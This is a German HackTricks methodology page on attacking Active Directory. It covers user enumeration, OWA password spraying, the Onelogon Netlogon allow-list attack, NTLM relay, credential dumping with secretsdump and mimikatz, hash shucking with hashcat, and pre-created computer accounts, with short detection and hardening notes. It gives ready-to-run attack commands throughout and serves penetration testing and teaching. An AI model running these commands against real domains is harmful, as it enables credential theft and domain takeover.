# Active-Directory-Methodik

{{#include ../../banners/hacktricks-training.md}}

## Grundlegender Überblick

**Active Directory** ist eine grundlegende Technologie, mit der **Netzwerkadministratoren** **Domänen**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient erstellen und verwalten können. Sie ist skalierbar und ermöglicht es, eine große Anzahl von Benutzern in überschaubare **Gruppen** und **Untergruppen** einzuteilen und **Zugriffsrechte** auf verschiedenen Ebenen zu steuern.

Die Struktur von **Active Directory** besteht aus drei Hauptebenen: **Domänen**, **Bäumen** und **Gesamtstrukturen**. Eine **Domäne** umfasst eine Sammlung von Objekten, beispielsweise **Benutzer** oder **Geräte**, die eine gemeinsame Datenbank nutzen. **Bäume** sind Gruppen solcher Domänen, die durch eine gemeinsame Struktur verbunden sind. Eine **Gesamtstruktur** umfasst mehrere Bäume, die über **Vertrauensstellungen** miteinander verbunden sind, und bildet die oberste Ebene der Organisationsstruktur. Auf jeder dieser Ebenen lassen sich bestimmte **Zugriffs-** und **Kommunikationsrechte** festlegen.

Zu den wichtigsten Konzepten in **Active Directory** gehören:

1. **Verzeichnis** – Enthält sämtliche Informationen zu Active-Directory-Objekten.
2. **Objekt** – Bezeichnet Entitäten im Verzeichnis, darunter **Benutzer**, **Gruppen** oder **freigegebene Ordner**.
3. **Domäne** – Dient als Container für Verzeichnisobjekte. In einer **Gesamtstruktur** können mehrere Domänen nebeneinander bestehen, die jeweils eine eigene Objektsammlung verwalten.
4. **Baum** – Eine Gruppe von Domänen, die dieselbe Stammdomäne nutzen.
5. **Gesamtstruktur** – Die oberste Ebene der Organisationsstruktur in Active Directory. Sie besteht aus mehreren Bäumen, zwischen denen **Vertrauensstellungen** bestehen.

**Active Directory Domain Services (AD DS)** umfasst verschiedene Dienste, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks entscheidend sind. Dazu gehören:

1. **Domänendienste** – Speichern Daten zentral und verwalten die Interaktionen zwischen **Benutzern** und **Domänen**, einschließlich Funktionen für **Authentifizierung** und **Suche**.
2. **Zertifikatdienste** – Verwalten die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützt verzeichnisfähige Anwendungen über das **LDAP-Protokoll**.
4. **Directory Federation Services** – Bietet **Single Sign-on**, damit Benutzer während einer Sitzung über mehrere Webanwendungen hinweg authentifiziert werden können.
5. **Rechteverwaltung** – Hilft beim Schutz urheberrechtlich geschützten Materials, indem dessen unbefugte Verbreitung und Nutzung reguliert wird.
6. **DNS-Dienst** – Entscheidend für die Auflösung von **Domänennamen**.

Eine ausführlichere Erklärung findest du unter: [**TechTerms - Definition von Active Directory**](https://techterms.com/definition/active_directory)

### **Kerberos-Authentifizierung**

Um zu lernen, wie man **ein AD angreift**, musst du den **Kerberos-Authentifizierungsprozess** wirklich gut **verstehen**.\
[**Lies diese Seite, falls du noch nicht weißt, wie er funktioniert.**](kerberos-authentication.md)

## Cheat Sheet

Unter [https://wadcoms.github.io/](https://wadcoms.github.io) findest du eine schnelle Übersicht über Befehle, mit denen du ein AD enumerieren/exploitieren kannst.

> [!WARNING]
> Die Kerberos-Kommunikation **erfordert normalerweise einen vollständig qualifizierten Domänennamen (FQDN)**, damit der Client ein Ticket für den richtigen SPN erhalten kann. Bei Zugriff auf einen Computer über seine IP-Adresse wird häufig stattdessen NTLM verwendet.

## Recon Active Directory (keine Zugangsdaten/Sitzungen)

Wenn du Zugriff auf eine AD-Umgebung hast, aber keine Zugangsdaten/Sitzungen besitzt, kannst du Folgendes versuchen:

- **Das Netzwerk pentesten:**
  - Scanne das Netzwerk, finde Computer und offene Ports und versuche, **Schwachstellen auszunutzen** oder **Zugangsdaten auszulesen** (zum Beispiel können [Drucker sehr interessante Ziele sein](ad-information-in-printers.md)).
  - Die DNS-Enumeration kann Informationen über wichtige Server in der Domäne liefern, etwa Webserver, Drucker, Freigaben, VPN, Medienserver usw.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Wirf einen Blick auf die allgemeine [**Pentesting-Methodik**](../../generic-methodologies-and-resources/pentesting-methodology.md), um mehr darüber zu erfahren, wie du dabei vorgehst.
- **Prüfe bei SMB-Diensten auf Null- und Guest-Zugriff** (dies funktioniert nicht mit modernen Windows-Versionen):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Eine ausführlichere Anleitung zur Enumeration eines SMB-Servers findest du hier:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP enumerieren**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Eine ausführlichere Anleitung zur LDAP-Enumeration findest du hier (achte besonders auf den **anonymen Zugriff**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Das Netzwerk vergiften**
  - Sammle Zugangsdaten, indem du [**mit Responder Dienste imitierst**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Greife auf Hosts zu, indem du [**den Relay-Angriff ausnutzt**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Sammle Zugangsdaten, indem du [**gefälschte UPnP-Dienste mit evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) **offenlegst**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extrahiere Benutzernamen/Namen aus internen Dokumenten, sozialen Medien und Diensten (vor allem Webdiensten) innerhalb der Domänenumgebungen sowie aus öffentlich verfügbaren Quellen.
  - Wenn du die vollständigen Namen von Mitarbeitern des Unternehmens findest, kannst du verschiedene AD-**Benutzername-Konventionen (**[**lies dies**](https://activedirectorypro.com/active-directory-user-naming-convention/)) ausprobieren. Die häufigsten Konventionen sind: _VornameNachname_, _Vorname.Nachname_, _VorNach_ (jeweils 3 Buchstaben), _Vor.Nach_, _VNachname_, _V.Nachname_, _NachnameVorname_, _Nachname.Vorname_, _NachnameV_, _Nachname.V_, 3 _zufällige Buchstaben und 3 zufällige Ziffern_ (abc123).
  - Tools:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Benutzer-Enumeration

- **Anonyme SMB-/LDAP-Enumeration:** Siehe die Seiten zu [**SMB-Pentesting**](../../network-services-pentesting/pentesting-smb/index.html) und [**LDAP-Pentesting**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute-Enumeration**: Wird ein **ungültiger Benutzername angefragt**, antwortet der Server mit dem **Kerberos-Fehlercode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_. So können wir feststellen, dass der Benutzername ungültig ist. Bei **gültigen Benutzernamen** wird entweder das **TGT in einer AS-REP**-Antwort zurückgegeben oder der Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_ ausgelöst, der darauf hinweist, dass der Benutzer eine Pre-Authentifizierung durchführen muss.
- **Keine Authentifizierung gegenüber MS-NRPC**: Dabei wird auth-level = 1 (keine Authentifizierung) gegenüber der MS-NRPC-Schnittstelle (Netlogon) auf Domänencontrollern verwendet. Nach dem Binden an die MS-NRPC-Schnittstelle ruft die Methode die Funktion `DsrGetDcNameEx2` auf, um ohne Zugangsdaten zu prüfen, ob der Benutzer oder Computer existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Untersuchung ist [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> zu finden.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Wenn du einen dieser Server im Netzwerk gefunden hast, kannst du auch **user enumeration gegen ihn durchführen**. Dafür könntest du beispielsweise das Tool [**MailSniper**](https://github.com/dafthack/MailSniper) verwenden:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Listen mit Benutzernamen findest du in [**diesem GitHub-Repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) und in diesem ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Allerdings solltest du die **Namen der Personen kennen, die im Unternehmen arbeiten** – diese solltest du bereits beim zuvor durchgeführten Recon ermittelt haben. Mit Vor- und Nachnamen kannst du das Skript [**namemash.py**](https://gist.github.com/superkojiman/11076951) verwenden, um mögliche gültige Benutzernamen zu generieren.

### Missbrauch der Allow-List für verwundbare Netlogon-Kanäle (Onelogon)

Selbst wenn **Zerologon** auf dem DC gepatcht ist, können explizit allow-gelistete Konten weiterhin **veraltetem/verwundbarem Netlogon-Secure-Channel-Verhalten** ausgesetzt sein. Die riskante Konfiguration ist die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** oder der entsprechende Registrierungswert **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Dieser Wert ist ein **SDDL-Sicherheitsdeskriptor** (siehe [Security Descriptors](security-descriptors.md)). Jedes Konto oder jede Gruppe, der in der DACL die entsprechende ACE gewährt wurde, kann zum Ziel werden. Zum Beispiel setzt `O:BAG:BAD:(A;;RC;;;WD)` effektiv **Everyone** auf die Allow-List.

Praktischer Workflow für Operatoren:

1. **Ermittle allow-gelistete Principals**, indem du sowohl **SYSVOL/GPO** als auch die **Live-Registrierung des DC** überprüfst.
2. **Löse die in der SDDL gefundenen SIDs auf**, um die entsprechenden AD-Benutzer und -Computer zu ermitteln, und priorisiere **DC-Computerkonten**, **Trust-Konten** und andere privilegierte Computer.
3. Versuche wiederholt eine **MS-NRPC-/Netlogon-Authentifizierung** als das allow-gelistete Konto.
4. Missbrauche nach einem erfolgreichen Guess das **Netlogon-Passwort-Setzen**, um das Passwort des Zielkontos zurückzusetzen (der öffentliche PoC setzt es auf eine leere Zeichenfolge).<sup>[[9]](#references)[[10]](#references)</sup>

Schnelle Triage-/Lab-Beispiele aus dem öffentlichen Artefakt:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Hinweise:

- Der **scanner** ist nützlich, weil die effektive Allowlist in **SYSVOL**, der **registry** oder in beiden vorhanden sein kann.
- Der Exploit-Pfad selbst ist wichtig, weil er **keine Domain-Admin-Berechtigungen erfordert**, sobald ein verwundbares Konto identifiziert wurde.
- Die Kompromittierung eines **Domain Controller machine account** wie `DC$` ist besonders gefährlich, weil das Zurücksetzen dieses Passworts direkt weiterführende **AD takeover**-Pfade ermöglichen kann.
- Ob **Brute Force durchführbar ist**, hängt vom Modus ab: Das öffentliche Artefakt beschreibt einen Meet-in-the-Middle-Ansatz, **24-Bit**-Brute-Force, wenn ein weiteres Computerkonto verfügbar ist, sowie langsamere **32-Bit**-Varianten.

Hinweise zu Detection und Hardening:

- Überprüfe die Allowlist-Richtlinie und entferne alles außer temporären, ausdrücklich erforderlichen Kompatibilitätsausnahmen.
- Überwache die DC-**System**-Ereignisse **5827/5828/5829/5830/5831**, um zu erkennen, wenn verwundbare Netlogon-Verbindungen abgewiesen, entdeckt oder durch eine Richtlinie ausdrücklich zugelassen werden.
- Behandle Konten in `VulnerableChannelAllowList` als **high-risk**, bis die Legacy-Abhängigkeit beseitigt ist.

### Einen oder mehrere Benutzernamen kennen

Okay, du weißt also, dass du bereits einen gültigen Benutzernamen hast, aber keine Passwörter ... Dann versuche Folgendes:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer das Attribut _DONT_REQ_PREAUTH_ **nicht hat**, kannst du für diesen Benutzer eine **AS_REP-Nachricht anfordern**, die Daten enthält, die mit einer Ableitung des Passworts des Benutzers verschlüsselt wurden.
- [**Password Spraying**](password-spraying.md): Versuche die **gängigsten Passwörter** mit jedem der ermittelten Benutzer. Vielleicht verwendet ein Benutzer ein schwaches Passwort (beachte die Passwortrichtlinie!).
  - Beachte, dass du auch **OWA-Server sprayen** kannst, um Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Du kannst möglicherweise einige Challenge-**Hashes** **erhalten**, indem du bestimmte **Netzwerk**-Protokolle **poisonst**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Die Active Directory-Aufzählung liefert Benutzernamen, E-Mail-Kennungen und Namensmuster, mögliche Ziel-Hosts sowie Dienste, die dazu gebracht werden können, sich zu authentifizieren. Nutze diesen Kontext, um geeignete NTLM-[**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) und mögliche Wege in die AD-Umgebung zu identifizieren.

### NetExec-Workspace-basierte Recon- und Relay-Statusprüfungen

- Verwende **`nxcdb`-Workspaces**, um den AD-Recon-Status pro Engagement zu speichern: `workspace create <name>` erstellt protokollspezifische SQLite-Datenbanken unter `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap usw.). Wechsle mit `proto smb|mssql|winrm` zwischen den Ansichten und liste mit `creds` erfasste Secrets auf. Lösche sensible Daten anschließend manuell: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Die schnelle Subnetz-Erkennung mit **`netexec smb <cidr>`** zeigt **domain**, **OS build**, **SMB signing requirements** und **Null Auth** an. Mitglieder mit `(signing:False)` sind **anfällig für Relay-Angriffe**, während DCs häufig Signing erfordern.
- Erzeuge **Hostnamen in /etc/hosts** direkt aus der NetExec-Ausgabe, um das Targeting zu erleichtern:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wenn **SMB relay zum DC durch Signing blockiert** wird, sollte dennoch die **LDAP**-Konfiguration geprüft werden: `netexec ldap <dc>` zeigt `(signing:None)` / schwaches Channel Binding an. Ein DC mit erforderlichem SMB Signing, aber deaktiviertem LDAP Signing bleibt ein geeignetes **Relay-to-LDAP**-Ziel für Angriffe wie **SPN-less RBCD**.

### Clientseitige Drucker-Credential-Leaks → umfangreiche Validierung von Domain-Credentials

- Drucker-/Web-UIs **betten manchmal maskierte Admin-Passwörter in HTML ein**. Die Quelltextansicht bzw. Devtools können Klartext offenlegen (z. B. `<input value="<password>">`) und so Basic-auth-Zugriff auf Scan-/Druck-Repositories ermöglichen.
- Abgerufene Druckaufträge können **Onboarding-Dokumente im Klartext** mit benutzerspezifischen Passwörtern enthalten. Die Zuordnungen beim Testen beibehalten:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM-Creds stehlen

Wenn du mit dem **null- oder guest-Benutzer auf andere PCs oder Shares zugreifen** kannst, könntest du **Dateien platzieren** (z. B. eine SCF-Datei), die, wenn auf sie zugegriffen wird, eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** und cracken kannst:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate-Angriffe

**Hash shucking** behandelt jeden NT-Hash, den du bereits besitzt, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT-Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos-RC4-Tickets, NetNTLM-Challenges oder zwischengespeicherten Credentials per Brute-Force anzugreifen, gibst du die NT-Hashes in die NT-Candidate-Modi von Hashcat ein und lässt diese die Wiederverwendung von Passwörtern prüfen, ohne jemals den Klartext zu erfahren. Besonders effektiv ist das nach einem Domain-Kompromiss, bei dem du Tausende aktuelle und historische NT-Hashes sammeln kannst.<sup>[[5]](#references)</sup>

Setze Shucking ein, wenn:

- Du einen NT-Hash-Bestand aus DCSync, SAM/SECURITY-Dumps oder Credential-Vaults hast und die Wiederverwendung in anderen Domains/Forests prüfen musst.
- Du RC4-basiertes Kerberos-Material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-Antworten oder DCC/DCC2-Blobs erfasst.
- Du die Wiederverwendung langer, nicht crackbarer Passphrasen schnell nachweisen und sofort per Pass-the-Hash pivotieren möchtest.

Die Technik **funktioniert nicht** bei Verschlüsselungstypen, deren Schlüssel nicht der NT-Hash ist (z. B. Kerberos etype 17/18 AES). Wenn eine Domain nur AES erzwingt, musst du auf die regulären Passwortmodi zurückgreifen.

#### Einen NT-Hash-Bestand aufbauen

- **DCSync/NTDS** – Verwende `secretsdump.py` mit dem Verlauf, um einen möglichst großen Satz an NT-Hashes (und deren vorherigen Werten) zu erfassen:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Verlaufseinträge erweitern den Kandidatenpool erheblich, da Microsoft bis zu 24 vorherige Hashes pro Konto speichern kann. Weitere Möglichkeiten, NTDS-Secrets zu sammeln, findest du hier:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpunkt-Cache-Dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM-/SECURITY-Daten und zwischengespeicherte Domain-Logons (DCC/DCC2). Entferne Duplikate und füge diese Hashes derselben `nt_candidates.txt`-Liste hinzu.
- **Metadaten erfassen** – Speichere den Benutzernamen/die Domain, von dem/der jeder Hash stammt (auch wenn die Wordlist nur Hex enthält). Übereinstimmende Hashes zeigen dir sofort, welcher Principal ein Passwort wiederverwendet, sobald Hashcat den passenden Kandidaten ausgibt.
- Bevorzuge Kandidaten aus derselben Forest oder einer vertrauenswürdigen Forest; das maximiert die Wahrscheinlichkeit einer Überschneidung beim Shucking.

#### Hashcat-Modi für NT-Kandidaten

| Hash-Typ                                | Passwortmodus | NT-Kandidatenmodus |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Hinweise:

- NT-Kandidaten-Eingaben **müssen rohe NT-Hashes aus 32 Hex-Zeichen bleiben**. Deaktiviere Rule-Engines (kein `-r`, keine Hybrid-Modi), da Mangling das Schlüsselmaterial der Kandidaten beschädigt.
- Diese Modi sind nicht grundsätzlich schneller, aber der NTLM-Keyspace (~30.000 MH/s auf einem M3 Max) ist ~100-mal schneller als Kerberos RC4 (~300 MH/s). Eine kuratierte NT-Liste zu testen, ist deutlich günstiger, als den gesamten Passwort-Keyspace im langsameren Format zu durchsuchen.
- Verwende immer den **aktuellsten Hashcat-Build** (`git clone https://github.com/hashcat/hashcat && make install`), da die Modi 31500/31600/35300/35400 erst kürzlich hinzugefügt wurden.<sup>[[7]](#references)</sup>
- Derzeit gibt es keinen NT-Modus für AS-REQ Pre-Auth, und AES-Etypes (19600/19700) erfordern das Klartextpasswort, da ihre Schlüssel über PBKDF2 aus UTF-16LE-Passwörtern abgeleitet werden und nicht aus rohen NT-Hashes.

#### Beispiel – Kerberoast RC4 (Modus 35300)

1. Erfasse mit einem Benutzer mit geringen Berechtigungen ein RC4-TGS für einen Ziel-SPN (Details findest du auf der Kerberoast-Seite):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Extrahiere das Ticket mithilfe deiner NT-Liste:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat leitet aus jedem NT-Kandidaten den RC4-Schlüssel ab und validiert den `$krb5tgs$23$...`-Blob. Ein Treffer bestätigt, dass das Dienstkonto einen deiner vorhandenen NT-Hashes verwendet.

3. Unmittelbar zu PtH wechseln:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Bei Bedarf kannst du den Klartext später mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen.

#### Beispiel – gecachte Zugangsdaten (mode 31600)

1. Dump gecachte Logons von einer kompromittierten Workstation:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopiere die DCC2-Zeile des interessanten Domänenbenutzers in `dcc2_highpriv.txt` und shucke sie:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Ein erfolgreicher Treffer liefert den NT-Hash, der bereits in deiner Liste steht, und beweist damit, dass der zwischengespeicherte Benutzer ein Passwort wiederverwendet. Verwende ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder führe damit einen Brute-Force-Angriff im schnellen NTLM-Modus durch, um den Klartext wiederherzustellen.

Der exakt gleiche Workflow gilt für NetNTLM Challenge-Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald ein Treffer gefunden wurde, kannst du Relay, SMB/WMI/WinRM PtH starten oder den NT-Hash offline erneut mit Masken/Regeln cracken.



## Active Directory mit Zugangsdaten/Session enumerieren

Für diese Phase musst du **die Zugangsdaten oder eine Session eines gültigen Domain-Kontos kompromittiert haben.** Wenn du gültige Zugangsdaten oder eine Shell als Domain-Benutzer hast, **solltest du daran denken, dass die zuvor genannten Optionen weiterhin Möglichkeiten sind, andere Benutzer zu kompromittieren**.

Mache dich vor Beginn der authentifizierten Enumeration mit dem **Kerberos-Double-Hop-Problem** vertraut.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Ein Konto zu kompromittieren ist ein **wichtiger Schritt bei der Bewertung der Domain**, da es eine authentifizierte **Active Directory-Enumeration** ermöglicht:

Mit Blick auf [**ASREPRoast**](asreproast.md) kannst du nun alle potenziell verwundbaren Benutzer finden. Beim [**Password Spraying**](password-spraying.md) kannst du eine **Liste aller Benutzernamen** erstellen und das Passwort des kompromittierten Kontos, leere Passwörter und neue aussichtsreiche Passwörter ausprobieren.

- Du kannst [**CMD für eine grundlegende Recon verwenden**](../basic-cmd-for-pentesters.md#domain-info)
- Du kannst auch [**PowerShell für Recon verwenden**](../basic-powershell-for-pentesters/index.html), was unauffälliger ist
- Außerdem kannst du [**PowerView verwenden**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren
- Ein weiteres hervorragendes Tool für Recon in einem Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht besonders unauffällig** (abhängig von den verwendeten Collection-Methoden). **Wenn dir das egal ist**, solltest du es unbedingt ausprobieren. Finde heraus, wo Benutzer RDP nutzen können, finde Pfade zu anderen Gruppen usw.
  - **Weitere automatisierte AD-Enumeration-Tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Prüfe [**DNS-Einträge des AD**](ad-dns-records.md), da sie interessante Informationen enthalten können.
- Ein **Tool mit GUI**, das du zur Enumeration des Verzeichnisses verwenden kannst, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Du kannst die LDAP-Datenbank auch mit **ldapsearch** nach Zugangsdaten in den Feldern _userPassword_ und _unixUserPassword_ oder sogar in den Notizen _description_ und _info_ von Benutzern durchsuchen. Ein nicht gekennzeichneter, passwortähnlicher Wert in _info_ ist lediglich ein möglicher Kandidat: Prüfe Zweck und Gültigkeit separat und gib Notiz-Inhalte bei der routinemäßigen Enumeration nicht aus. Weitere Methoden findest du unter [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment).
- Prüfe **zugängliche** Domain-Logon- und Laufwerkszuordnungsskripte unter `\\<dc>\NETLOGON` oder `\\<dc>\SYSVOL\<domain>\scripts`, sofern du dazu berechtigt bist. [Microsoft dokumentiert](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) die Rolle des NETLOGON-Shares als Skriptverzeichnis. Liste zuerst die Namen auf und prüfe anschließend nur relevante, lesbare Skripte innerhalb eines Größenlimits. Gib nicht den gesamten Share aus und zeige bei der routinemäßigen Enumeration keine Zugangsdaten an. Ein PowerShell-Aufruf von [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **schützt kein Klartextpasswort**, das im Skript gespeichert ist. Der Aufruf allein beweist nicht, dass ein Secret fest codiert ist: Verfolge die tatsächliche Eingabe und prüfe anschließend separat das Konto, die Gültigkeit der Zugangsdaten und die Berechtigungen. Die Prüfung eines Domain-Skripts auf einem Remote-Share ist von der lokalen Host-Enumeration getrennt.
- Wenn du **Linux** verwendest, kannst du die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Du kannst auch automatisierte Tools ausprobieren, zum Beispiel:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Alle Domain-Benutzer extrahieren**

  Es ist sehr einfach, alle Domain-Benutzernamen unter Windows abzurufen (`net user /domain` ,`Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux kannst du Folgendes verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Abschnitt zur Enumeration kurz wirkt, ist er der wichtigste Teil überhaupt. Öffne die Links (vor allem die zu cmd, powershell, powerview und BloodHound), lerne, wie man eine Domain enumeriert, und übe, bis du dich sicher fühlst. Während eines Assessments ist dies der entscheidende Moment, um deinen Weg zu DA zu finden oder festzustellen, dass nichts zu machen ist.

### Vorhersagbare vorab erstellte Computerkonten -> Zugriff auf gMSA-Passwörter

Computerkonten, die für ältere Joins vorbereitet wurden, können ein vorhersagbares initiales Passwort behalten. Das `pre2k`-Modul von NetExec identifiziert den charakteristischen `userAccountControl`-Wert `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) und versucht, ein Kerberos-TGT mit den ersten 14 Zeichen des kleingeschriebenen Computernamens ohne abschließendes `$` abzurufen. Betrachte diesen UAC-Wert als Kandidatenauswahl und gehe nicht davon aus, dass die Mitgliedschaft in **Pre-Windows 2000 Compatible Access** allein ein schwaches Passwort beweist.<sup>[[18]](#references)[[20]](#references)</sup>

Verwende die authentifizierte LDAP-Enumeration, um die Kandidaten zu prüfen und erfolgreiche TGTs zu speichern. `ALL=True` erweitert die Tests über Objekte hinaus, die dem Standardfilter `4128` entsprechen.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

